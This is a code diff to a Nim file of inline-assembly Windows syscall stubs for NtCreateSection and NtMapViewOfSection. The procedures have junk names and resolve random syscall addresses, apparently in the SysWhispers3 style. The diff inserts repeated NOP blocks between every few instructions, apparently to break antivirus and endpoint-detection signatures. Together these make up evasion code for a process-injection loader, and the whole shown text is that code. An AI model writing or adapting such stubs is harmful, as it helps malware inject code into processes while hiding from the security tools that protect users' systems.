@@ -677,44 +677,191 @@ proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
 # NtCreateSection
 proc iuhqdihasduiahsdaksdhak*(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x08D17AF86
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov ecx, 0x08D17AF86
 	call SW3_GetRandomSyscallAddress        
-	mov r15, rax                           
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r15, rax                           
 	mov ecx, 0x08D17AF86
-	call SW3_GetSyscallNumber              
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
 	add rsp, 0x28
-	mov rcx, [rsp+8]                      
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rcx, [rsp+8]                      
 	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
 	mov r9, [rsp+32]
-	mov r10, rcx
-	jmp r15                                
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    jmp r15                                
     """
 # NtMapViewOfSection
 proc uihzasdbnqlpoasdlykxc*(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+24], r8
 	mov [rsp+32], r9
-	sub rsp, 0x28
-	mov ecx, 0x068A01BAD
-	call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    sub rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov ecx, 0x068A01BAD
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetRandomSyscallAddress        
 	mov r15, rax                           
-	mov ecx, 0x068A01BAD
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov ecx, 0x068A01BAD
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	jmp r15                                
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r9, [rsp+32]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    jmp r15                                
     """
 
 
